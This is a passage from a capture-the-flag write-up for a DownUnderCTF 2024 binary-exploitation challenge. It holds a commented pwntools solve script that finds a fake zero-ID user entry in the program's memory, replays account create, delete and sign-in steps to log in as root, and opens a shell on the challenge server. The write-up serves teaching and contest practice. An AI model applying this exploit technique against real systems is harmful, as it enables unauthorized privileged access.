7ffe04fc8000-7ffe04fca000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w">                          </span><span class="o">[</span>vdso<span class="o">]</span>
</code></pre></div></td></tr></table></div></p>
<p>Script to find address that points to memory that can be interpreted as user account with id 0:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">script.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># start scan of memory at base address of the application</span>
<span class="n">module_start</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="c1"># we only interested in readonly memory (24 bytes padding for safety as user structure is 24 bytes long)</span>
<span class="n">module_end</span> <span class="o">=</span> <span class="mh">0x404000</span> <span class="o">-</span> <span class="mi">24</span>

<span class="c1"># iterate over memory addresses</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">module_start</span><span class="p">,</span> <span class="n">module_end</span><span class="p">):</span>
    <span class="c1"># read value stored at i (unpack convertes from little endian byte array into int)</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
    <span class="c1"># if value i is a number in range module_start..module_end it can be interpreted as address.</span>
    <span class="c1"># Also check value that address i is pointing to, target application will treat that value as user ID.</span>
    <span class="c1"># We are looking for user ID equal to 0</span>
    <span class="k">if</span> <span class="n">module_start</span> <span class="o">&lt;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="n">module_end</span> <span class="ow">and</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">fake_root_entry</span> <span class="o">=</span> <span class="n">i</span>
        <span class="k">break</span>

<span class="c1"># use fake user entry that we found to calculate user account details</span>
<span class="n">fake_account_address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="c1"># first field of user structuture is user ID 8 bytes</span>
<span class="n">fake_account_id</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_account_address</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="c1"># second field (offset 8) in user structure is username 8 bytes</span>
<span class="n">fake_account_username</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_account_address</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="c1"># third field (offset sum of length previous files 8 + 8) in user structure is password 8 bytes</span>
<span class="n">fake_account_password</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_account_address</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;fake entry address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">fake_account_id</span><span class="si">=}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;fake account username </span><span class="si">{</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">fake_account_username</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;fake account password </span><span class="si">{</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">fake_account_password</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">output.txt</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>fake<span class="w"> </span>entry<span class="w"> </span>address<span class="w"> </span>0x403eb8
<span class="nv">fake_account_id</span><span class="o">=</span><span class="m">0</span>
fake<span class="w"> </span>account<span class="w"> </span>username<span class="w"> </span>b<span class="s1">&#39;0000000000000000&#39;</span>
fake<span class="w"> </span>account<span class="w"> </span>password<span class="w"> </span>b<span class="s1">&#39;0000000000000000&#39;</span>
</code></pre></div></td></tr></table></div>
<p><strong>Steps 2-5</strong>: exploit</p>
<p>I used pwntools to automate necessary steps (account creation, sign in, deletion etc...):</p>
<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait till target application is initialized</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 1 - create account</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;one&quot;</span><span class="p">)</span>                 <span class="c1"># enter username</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait password prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">))</span>  <span class="c1"># send address as fake root entry as password (converting into little endian)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 2 - sign in</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;one&quot;</span><span class="p">)</span>                 <span class="c1"># enter username</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait password prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">))</span>  <span class="c1"># enter password</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 3 - remove account</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 1 - create account</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;two&quot;</span><span class="p">)</span>                 <span class="c1"># enter username</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait password prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;two&quot;</span><span class="p">)</span>                 <span class="c1"># enter password</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 2 - signup</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="c1"># enter username and password of our fake user account</span>
<span class="c1"># note that both fields are concatenated.</span>
<span class="c1"># if we use sendline(fake_account_username) then sendline(fake_account_password)</span>
<span class="c1"># then first sendline would append &#39;\n&#39; and password wont match</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fake_account_username</span> <span class="o">+</span> <span class="n">fake_account_password</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 4 - Get shell</span>
</code></pre></div></td></tr></table></div>
<p>And full script:</p>
<details class="success">
<summary>solve.py</summary>
<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span>
<span class="normal">74</span>
<span class="normal">75</span>
<span class="normal">76</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfexe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./app&#39;</span><span class="p">)</span> 
<span class="n">libc</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">libc</span> 

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;warn&#39;</span>

<span class="n">arguments</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">remote_server</span> <span class="o">=</span> <span class="s1">&#39;2024.ductf.dev&#39;</span> 
    <span class="n">remote_port</span> <span class="o">=</span> <span class="mi">30022</span>  
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_server</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elfexe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">arguments</span><span class="p">)</span>

<span class="c1"># start scan of memory at base address of the application</span>
<span class="n">module_start</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="c1"># we only interested in readonly memory (16 bytes padding for safety as user structure is 24 bytes long)</span>
<span class="n">module_end</span> <span class="o">=</span> <span class="mh">0x404000</span> <span class="o">-</span> <span class="mi">24</span>

<span class="c1"># iterate over memory addresses</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">module_start</span><span class="p">,</span> <span class="n">module_end</span><span class="p">):</span>
    <span class="c1"># read value stored at i (unpack convertes from little endian byte array into int)</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
    <span class="c1"># if value i is address in range module_start..module_end</span>
    <span class="c1"># then read value that i is pointing to - its user ID, if user ID is 0 then we found good address</span>
    <span class="c1"># to use as fake user entry</span>
    <span class="k">if</span> <span class="n">module_start</span> <span class="o">&lt;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="n">module_end</span> <span class="ow">and</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">fake_root_entry</span> <span class="o">=</span> <span class="n">i</span>
        <span class="k">break</span>

<span class="c1"># use fake user entry that we found calculate user account details</span>
<span class="n">fake_account_address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="n">fake_account_id</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_account_address</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="n">fake_account_username</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_account_address</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">fake_account_password</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">fake_account_address</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;fake entry address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">fake_account_id</span><span class="si">=}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;fake account username </span><span class="si">{</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">fake_account_username</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;fake account password </span><span class="si">{</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">fake_account_password</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait till target application initialised</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 1 - create account</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;one&quot;</span><span class="p">)</span>                 <span class="c1"># enter username</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait password prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">))</span>  <span class="c1"># send address as fake root entry as password (converting into little endian)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 2 - sign in</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;one&quot;</span><span class="p">)</span>                 <span class="c1"># enter username</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait password prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">fake_root_entry</span><span class="p">))</span>  <span class="c1"># enter password</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 3 - remove account</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 1 - create account</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;two&quot;</span><span class="p">)</span>                 <span class="c1"># enter username</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait password prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;two&quot;</span><span class="p">)</span>                 <span class="c1"># enter password</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># wait prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 2 - signup</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>                  <span class="c1"># wait username prompt</span>
<span class="c1"># enter username and password of the fake entity that has id 0</span>
<span class="c1"># note that both fields are concatenated.</span>
<span class="c1"># if we use sendline(fake_account_username) then sendline(fake_account_password)</span>
<span class="c1"># then because sendline appends &#39;\n&#39; it would be treated as part of password and sign in fails</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fake_account_username</span> <span class="o">+</span> <span class="n">fake_account_password</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                 <span class="c1"># failed prompt</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>                   <span class="c1"># enter choice 4 - Get shell</span>

<span class="c1"># we should have remove shell now - switch to interactive mode</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
</details>
<h2 id="epilogue">Epilogue<a class="headerlink" href="#epilogue" title="Permanent link">&para;</a></h2>
<ul>
<li>Official website: <a href="https://downunderctf.com/">https://downunderctf.com/</a></li>
<li>Official writeups: <a href="https://github.com/DownUnderCTF/Challenges_2024_Public">https://github.com/DownUnderCTF/Challenges_2024_Public</a></li>
</ul>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../dna/" class="md-footer__link md-footer__link--prev" aria-label="Previous: DNAdecay">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                DNAdecay
              </div>
            </div>
          </a>
        
        
          
          <a href="../sssshhhh/" class="md-footer__link md-footer__link--next" aria-label="Next: sssshhhh">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                sssshhhh
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.footer", "content.action.edit"], "search": "../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.c8d2eff1.min.js"></script>
      
        <script src="../search/main.js"></script>
      
    
  </body>
</html>